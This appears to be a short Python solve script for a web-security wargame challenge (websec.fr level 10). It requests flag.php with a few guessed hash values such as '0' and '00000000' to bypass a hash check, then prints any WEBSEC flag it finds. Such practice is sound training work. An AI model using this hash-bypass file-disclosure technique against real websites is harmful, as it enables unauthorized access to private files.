#!/usr/bin/env python3
import hashlib
import requests

# Probar hashes simples y conocidos para flag.php
test_hashes = [
    "0",
    "00000000",
    "b4382d64",  # hash de index.php
]

url = "https://websec.fr/level10/index.php"

for h in test_hashes:
    print(f"Probando hash: {h}")
    r = requests.get(url, params={"f": "flag.php", "hash": h})
    if "WEBSEC{" in r.text:
        print(f"¡ENCONTRADO! Hash: {h}")
        print(r.text[r.text.find("WEBSEC{"):r.text.find("}")+1])
        break
    elif "Permission denied" not in r.text and "flag.php" in r.text.lower():
        print("Respuesta interesante:")
        print(r.text[:500])